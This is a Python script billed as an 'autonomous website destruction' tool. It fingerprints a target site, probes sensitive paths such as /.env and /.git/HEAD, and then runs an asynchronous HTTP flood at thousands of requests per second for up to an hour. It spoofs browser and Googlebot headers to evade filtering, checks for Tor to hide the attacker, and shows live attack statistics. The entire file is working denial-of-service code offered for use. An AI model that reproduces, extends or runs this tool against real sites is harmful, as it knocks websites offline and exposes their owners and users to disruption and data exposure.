#!/usr/bin/env python3
"""
IRFAN'S DESTRUCTION TOOL v2.0
Author: IRFAN
Autonomous Website Destruction System
"""

import os
import sys
import time
import signal
import random
import threading
import socket
import urllib.parse
import requests
import asyncio
import aiohttp
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from rich import box
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn
import colorama
import socks
import struct
import ssl
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(InsecureRequestWarning)
colorama.init(autoreset=True)
console = Console(force_terminal=True)

# Global variables
ATTACKING = False
STATS = {'req': 0, 'success': 0, 'block': 0, 'error': 0, 'rps': 0, 'bytes': 0}
LOCK = threading.Lock()
START_TIME = 0
LAST_COUNT = 0
TARGET = ""
PROTOCOL, HOST, PORT, PATH = "", "", 80, "/"
MAX_THREADS = 500
MAX_RPS = 5000
ATTACK_MODE = "auto"
TOR_AVAILABLE = False

# Advanced headers for bypass
BYPASS_HEADERS = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0',
        'DNT': '1'
    },
    {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'X-Requested-With': 'XMLHttpRequest'
    },
    {
        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'From': 'googlebot(at)googlebot.com'
    }
]

# Attack paths
ATTACK_PATHS = ['/', '/index.php', '/wp-admin/', '/admin/', '/login', '/api/', '/wp-login.php',
                '/administrator/', '/user', '/dashboard', '/xmlrpc.php', '/wp-json/', '/.env', 
                '/config.php', '/phpinfo.php', '/server-status', '/.git/HEAD']

# ==================== TOR CHECK ====================
def check_tor():
    global TOR_AVAILABLE
    try:
        sock = socks.socksocket()
        sock.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        sock.settimeout(3)
        sock.connect(("check.torproject.org", 80))
        sock.close()
        TOR_AVAILABLE = True
        return True
    except:
        TOR_AVAILABLE = False
        return False

# ==================== TARGET PARSER ====================
def parse_target(target):
    global PROTOCOL, HOST, PORT, PATH
    parsed = urllib.parse.urlparse(target if target.startswith(('http://', 'https://')) else f'http://{target}')
    PROTOCOL = parsed.scheme
    HOST = parsed.hostname
    PORT = parsed.port or (443 if PROTOCOL == 'https' else 80)
    PATH = parsed.path or '/'

# ==================== IRFAN BANNER ====================
def irfan_banner():
    banner_text = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║    ██╗██████╗ ███████╗ █████╗ ███╗   ██╗                    ║
    ║    ██║██╔══██╗██╔════╝██╔══██╗████╗  ██║                    ║
    ║    ██║██████╔╝█████╗  ███████║██╔██╗ ██║                    ║
    ║    ██║██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║                    ║
    ║    ██║██║  ██║███████╗██║  ██║██║ ╚████║                    ║
    ║    ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝                    ║
    ║                                                              ║
    ║    ╔══════════════════════════════════════════════════════╗  ║
    ║    ║     AUTONOMOUS DESTRUCTION TOOL v2.0 - BY IRFAN      ║  ║
    ║    ╚══════════════════════════════════════════════════════╝  ║
    ║                                                              ║
    ║    [•] Multi-Vector Attacks     [•] Auto-Target Analysis    ║
    ║    [•] WAF Bypass               [•] Stealth Mode            ║
    ║    [•] Async Engine             [•] Real-time Analytics     ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    console.print(Panel.fit(banner_text, 
                          title="[bold red]🔥 IRFAN'S DESTRUCTION ENGINE 🔥[/]", 
                          border_style="bold red",
                          padding=(1, 2)))

# ==================== TARGET ANALYZER ====================
class TargetAnalyzer:
    def __init__(self, url):
        self.url = url
        self.tech_stack = {}
        self.vulnerabilities = []
        self.recommended_attack = "http"
    
    def analyze(self):
        """Automatic target analysis"""
        try:
            # Basic request to detect tech
            resp = requests.get(self.url, timeout=5, verify=False, headers=random.choice(BYPASS_HEADERS))
            
            # Detect technologies
            if '/wp-content/' in resp.text or '/wp-admin/' in resp.text:
                self.tech_stack['wordpress'] = True
                self.recommended_attack = "multi"
            
            if 'joomla' in resp.text.lower() or '/administrator/' in resp.text:
                self.tech_stack['joomla'] = True
            
            if 'drupal' in resp.text.lower():
                self.tech_stack['drupal'] = True
            
            # Detect server
            server_header = resp.headers.get('Server', '').lower()
            if 'cloudflare' in server_header:
                self.tech_stack['cloudflare'] = True
                self.recommended_attack = "slowloris"
            elif 'nginx' in server_header:
                self.tech_stack['nginx'] = True
            elif 'apache' in server_header:
                self.tech_stack['apache'] = True
            
            # Check for vulnerabilities
            self.scan_vulnerabilities()
            
        except Exception as e:
            console.print(f"[yellow]⚠️  Analysis limited: {str(e)}[/]")
    
    def scan_vulnerabilities(self):
        """Scan for common vulnerabilities"""
        vuln_endpoints = [
            '/xmlrpc.php',
            '/wp-json/wp/v2/users',
            '/.env',
            '/phpinfo.php',
            '/server-status',
            '/admin/config.php',
            '/debug',
            '/test',
            '/backup',
            '/database.sql'
        ]
        
        for endpoint in vuln_endpoints:
            try:
                test_url = f"{self.url.rstrip('/')}{endpoint}"
                resp = requests.get(test_url, timeout=2, verify=False)
                if resp.status_code in [200, 403, 500]:
                    self.vulnerabilities.append(endpoint)
            except:
                continue
    
    def get_attack_config(self):
        """Get optimized attack configuration"""
        config = {
            'threads': 400,
            'rps': 3000,
            'mode': self.recommended_attack,
            'duration': 3600  # 1 hour
        }
        
        # Adjust based on findings
        if 'cloudflare' in self.tech_stack:
            config['threads'] = 200
            config['rps'] = 1000
            config['mode'] = 'slowloris'
        
        if 'wordpress' in self.tech_stack:
            config['threads'] = 500
            config['rps'] = 5000
            config['mode'] = 'multi'
        
        return config

# ==================== ASYNC ATTACK WORKER ====================
class AsyncAttackWorker:
    def __init__(self):
        self.session = None
        self.success_count = 0
        self.error_count = 0
    
    async def create_session(self):
        """Create async session"""
        timeout = aiohttp.ClientTimeout(total=10)
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=random.choice(BYPASS_HEADERS)
        )
    
    async def http_attack(self):
        """Async HTTP attack"""
        try:
            if not self.session:
                await self.create_session()
            
            # Generate random path
            path = random.choice(ATTACK_PATHS)
            url = f"{PROTOCOL}://{HOST}:{PORT}{path}"
            
            async with self.session.get(url, ssl=False) as response:
                content = await response.read()
                with LOCK:
                    STATS['bytes'] += len(content)
                
                if 200 <= response.status < 400:
                    return 'success'
                elif response.status in [403, 429, 503]:
                    return 'block'
                else:
                    return 'success'
                    
        except Exception as e:
            return 'error'
    
    async def attack_loop(self):
        """Main attack loop"""
        while ATTACKING:
            result = await self.http_attack()
            with LOCK:
                STATS['req'] += 1
                if result == 'success':
                    STATS['success'] += 1
                elif result == 'block':
                    STATS['block'] += 1
                else:
                    STATS['error'] += 1
            
            # Rate limiting
            if MAX_RPS > 0:
                await asyncio.sleep(1.0 / MAX_RPS)

# ==================== STATS DISPLAY ====================
def stats_display():
    """Real-time stats display"""
    global LAST_COUNT
    
    with Live(refresh_per_second=4) as live:
        while ATTACKING:
            time.sleep(0.25)
            
            with LOCK:
                total = STATS['req']
                elapsed = time.time() - START_TIME
                rps = (total - LAST_COUNT) / 0.25 if elapsed > 0 else 0
                LAST_COUNT = total
                STATS['rps'] = max(STATS['rps'], rps)
                mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            success_rate = (STATS['success'] / max(total, 1)) * 100
            
            # Create table
            table = Table(title=f"IRFAN'S DESTRUCTION TOOL | {ATTACK_MODE.upper()} MODE | LIVE ATTACK",
                         box=box.DOUBLE_EDGE, title_style="bold magenta",
                         show_header=True, header_style="bold cyan")
            
            table.add_column("METRIC", style="cyan", width=20)
            table.add_column("VALUE", style="bold green", width=15)
            table.add_column("STATUS", style="yellow", width=25)
            
            table.add_row("TARGET", f"{HOST}:{PORT}", f"{PROTOCOL.upper()}")
            table.add_row("LIVE RPS", f"{int(rps):,}", f"MAX: {MAX_RPS:,}")
            table.add_row("BANDWIDTH", f"{mbps:.1f} MB/s", "")
            table.add_row("REQUESTS", f"{total:,}", "")
            table.add_row("SUCCESS", f"{STATS['success']:,}", f"{success_rate:.1f}%")
            table.add_row("BLOCKED", f"{STATS['block']:,}", "")
            table.add_row("ERRORS", f"{STATS['error']:,}", "")
            table.add_row("BYTES SENT", f"{STATS['bytes']/1024/1024:.1f} MB", "")
            table.add_row("UPTIME", f"{int(elapsed)}s", f"PEAK: {int(STATS['rps']):,} RPS")
            table.add_row("ANONYMITY", "TOR" if TOR_AVAILABLE else "DIRECT", "")
            
            live.update(table)

# ==================== SIGNAL HANDLER ====================
def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    global ATTACKING
    ATTACKING = False
    console.print("\n[yellow]⚠️  Stopping attack...[/]")
    time.sleep(2)
    final_report()
    sys.exit(0)

# ==================== FINAL REPORT ====================
def final_report():
    """Generate final attack report"""
    total = STATS['req']
    elapsed = time.time() - START_TIME
    success_rate = (STATS['success'] / max(total, 1)) * 100
    avg_rps = total / elapsed if elapsed > 0 else 0
    mbps = (STATS['bytes'] / 1024 / 1024) / elapsed if elapsed > 0 else 0
    
    report = f"""
    ╔══════════════════════════════════════════════════════╗
    ║               ATTACK COMPLETE - BY IRFAN             ║
    ╠══════════════════════════════════════════════════════╣
    ║  Target:     {PROTOCOL}://{HOST}:{PORT}{PATH:<20} ║
    ║  Duration:   {int(elapsed)} seconds{'':<25} ║
    ║  Requests:   {total:,}{'':<30} ║
    ║  Avg RPS:    {int(avg_rps):,}{'':<30} ║
    ║  Success:    {success_rate:.1f}%{'':<33} ║
    ║  Bandwidth:  {mbps:.1f} MB/s{'':<28} ║
    ║  Bytes Sent: {STATS['bytes']/1024/1024:.1f} MB{'':<23} ║
    ╚══════════════════════════════════════════════════════╝
    """
    
    console.print(Panel.fit(report, border_style="bold green"))

# ==================== AUTONOMOUS MODE ====================
def autonomous_mode():
    """Fully autonomous attack mode"""
    console.print(Panel.fit(
        "[bold red]🤖 AUTONOMOUS DESTRUCTION MODE ACTIVATED[/]\n"
        "[yellow]Just provide URL - I'll handle everything![/]",
        border_style="bold red"
    ))
    
    # Get target
    target_url = input("\n🎯 [bold cyan]Enter Target URL: [/]").strip()
    
    if not target_url:
        console.print("[red]❌ No target provided![/]")
        return
    
    # Analyze target
    console.print("[yellow]🔍 Analyzing target...[/]")
    analyzer = TargetAnalyzer(target_url)
    analyzer.analyze()
    
    # Get attack config
    config = analyzer.get_attack_config()
    
    # Display analysis
    console.print(Panel.fit(
        f"[bold green]📊 TARGET ANALYSIS COMPLETE[/]\n\n"
        f"[cyan]Technologies:[/] {list(analyzer.tech_stack.keys()) or 'Unknown'}\n"
        f"[cyan]Vulnerabilities:[/] {analyzer.vulnerabilities[:3] or 'None'}\n"
        f"[cyan]Recommended Attack:[/] {config['mode'].upper()}\n"
        f"[cyan]Threads:[/] {config['threads']} | [cyan]RPS:[/] {config['rps']:,}\n"
        f"[cyan]Duration:[/] {config['duration']//60} minutes",
        border_style="bold green"
    ))
    
    # Set global config
    global TARGET, MAX_THREADS, MAX_RPS, ATTACK_MODE
    TARGET = target_url
    parse_target(TARGET)
    MAX_THREADS = config['threads']
    MAX_RPS = config['rps']
    ATTACK_MODE = config['mode']
    
    # Confirm attack
    confirm = input("\n🚀 [bold yellow]Launch attack? (Y/N): [/]").strip().lower()
    if confirm != 'y':
        console.print("[red]❌ Attack cancelled![/]")
        return
    
    # Launch attack
    launch_attack()

# ==================== LAUNCH ATTACK ====================
def launch_attack():
    """Launch the main attack"""
    global ATTACKING, START_TIME
    
    console.print(f"\n[bold red]💀 LAUNCHING ATTACK ON {HOST}...[/]")
    time.sleep(2)
    
    ATTACKING = True
    START_TIME = time.time()
    
    # Start stats display
    stats_thread = threading.Thread(target=stats_display, daemon=True)
    stats_thread.start()
    
    # Start async attack
    async def start_async_attack():
        workers = [AsyncAttackWorker() for _ in range(min(MAX_THREADS, 200))]
        tasks = [worker.attack_loop() for worker in workers]
        await asyncio.gather(*tasks)
    
    # Run attack for 1 hour or until stopped
    try:
        asyncio.run(start_async_attack())
    except KeyboardInterrupt:
        signal_handler(None, None)

# ==================== MANUAL MODE ====================
def manual_mode():
    """Manual configuration mode"""
    console.print(Panel.fit(
        "[bold yellow]🔧 MANUAL CONFIGURATION MODE[/]\n"
        "Configure attack parameters manually",
        border_style="bold yellow"
    ))
    
    # Get target
    target_url = input("\n🎯 [bold cyan]Enter Target URL: [/]").strip()
    if not target_url:
        console.print("[red]❌ No target provided![/]")
        return
    
    # Parse target
    global TARGET
    TARGET = target_url
    parse_target(TARGET)
    
    # Configuration
    console.print("\n[bold cyan]⚙️  ATTACK CONFIGURATION[/]")
    
    threads = input(f"Threads [{MAX_THREADS}]: ").strip()
    if threads.isdigit():
        global MAX_THREADS
        MAX_THREADS = int(threads)
    
    rps = input(f"RPS [{MAX_RPS}]: ").strip()
    if rps.isdigit():
        global MAX_RPS
        MAX_RPS = int(rps)
    
    # Attack mode selection
    console.print("\n[bold cyan]🎯 ATTACK MODES:[/]")
    console.print("1. HTTP Flood (Default)")
    console.print("2. Slowloris")
    console.print("3. Multi-Vector")
    
    mode = input("\nSelect mode [1-3]: ").strip()
    global ATTACK_MODE
    if mode == '2':
        ATTACK_MODE = "slowloris"
    elif mode == '3':
        ATTACK_MODE = "multi"
    else:
        ATTACK_MODE = "http"
    
    # Launch
    launch_attack()

# ==================== MAIN MENU ====================
def main_menu():
    """Main menu"""
    os.system('clear' if os.name == 'posix' else 'cls')
    irfan_banner()
    
    # Check TOR
    console.print("[yellow]🔍 Checking TOR connection...[/]")
    if check_tor():
        console.print("[green]✅ TOR connection active[/]")
    else:
        console.print("[yellow]⚠️  TOR not available, using direct connection[/]")
    
    # Menu options
    console.print(Panel.fit(
        "[bold cyan]SELECT OPERATION MODE:[/]\n\n"
        "1. 🤖 Autonomous Mode (Recommended)\n"
        "   - Automatic target analysis\n"
        "   - Optimized attack configuration\n"
        "   - One-click destruction\n\n"
        "2. 🔧 Manual Mode\n"
        "   - Full control over parameters\n"
        "   - Custom configuration\n\n"
        "3. ❌ Exit",
        border_style="bold cyan"
    ))
    
    choice = input("\n👉 Select option [1-3]: ").strip()
    
    if choice == '1':
        autonomous_mode()
    elif choice == '2':
        manual_mode()
    elif choice == '3':
        console.print("[red]👋 Exiting...[/]")
        sys.exit(0)
    else:
        console.print("[red]❌ Invalid choice![/]")
        time.sleep(2)
        main_menu()

# ==================== MAIN ====================
def main():
    """Main function"""
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            main_menu()
            restart = input("\n🔄 [bold yellow]Start new attack? (Y/N): [/]").strip().lower()
            if restart != 'y':
                console.print("[red]👋 Exiting...[/]")
                break
    except Exception as e:
        console.print(f"[red]❌ Error: {str(e)}[/]")
        sys.exit(1)

if __name__ == "__main__":
    main()